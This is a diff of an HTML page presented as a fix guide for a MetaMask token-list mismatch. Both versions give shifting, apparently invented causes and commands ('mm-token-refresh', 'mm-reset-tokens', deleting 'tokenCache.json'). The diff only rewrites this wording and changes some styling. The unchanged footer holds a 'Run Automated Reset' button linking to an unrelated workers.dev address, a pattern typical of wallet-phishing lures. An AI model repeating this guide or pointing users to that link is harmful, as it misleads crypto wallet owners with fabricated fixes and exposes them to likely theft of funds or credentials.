@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Manage Tokens Miss Match With Net – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
+        font-family: system-ui;
         background: #1a1a24;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #cf6679; }
     .btn {
         background: #ff7b2c;
         color: #000;
@@ -42,30 +42,30 @@
 <h1>Metamask Extension Bug Assets Manage Tokens Miss Match With Net</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a mismatch between the tokens listed in the Metamask extension's "Assets" section and the network filter, resulting in tokens being displayed incorrectly or not at all.</li>
+<li>Users experience a mismatch between the tokens displayed in the Metamask extension's "Manage Tokens" section and the network filter, resulting in tokens being displayed incorrectly or not at all.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension's token management system, which fails to correctly synchronize token listings with the selected network, leading to discrepancies in token visibility.</li>
+<li>The error occurs due to a desynchronization between the Metamask extension's internal token registry and the Ethereum network's actual token listings, often caused by outdated or corrupted token data.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can try the following manual overrides:</li>
-<li>Reset the Metamask extension's token cache by deleting the <code>tokenCache.json</code> file.</li>
-<li>Update the Metamask extension to the latest version to ensure bug fixes are applied.</li>
-<li>Use the following command to manually refresh the token list:</li>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Refresh the token list by reinstalling the Metamask extension</li>
+<li>Update the Ethereum network configuration to ensure it matches the current network</li>
+<li>Run the following command to reset the token registry:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>mm-token-refresh<span class="w"> </span>--network<span class="w"> </span>mainnet
+<div class="codehilite"><pre><span></span><code>mm-reset-tokens<span class="w"> </span>--network<span class="w"> </span>mainnet
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and configuration options.</p>
+<p>Consider utilizing an external console for more advanced troubleshooting. </p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured</li>
-<li>ETH network selected</li>
-<li>Token management permissions enabled</li>
+<li>Ethereum network connection established</li>
+<li>Basic understanding of Ethereum and Metamask functionality</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-p0-investigate-and-cap-multichain-account-cr.html">Metamask Extension P0 Investigate And Cap Multichain Account Creation/Syncing Span Fan-Out</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-notifications-notification-badge-red-num.html">Metamask Extension Bug Notifications Notification Badge Red Num</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
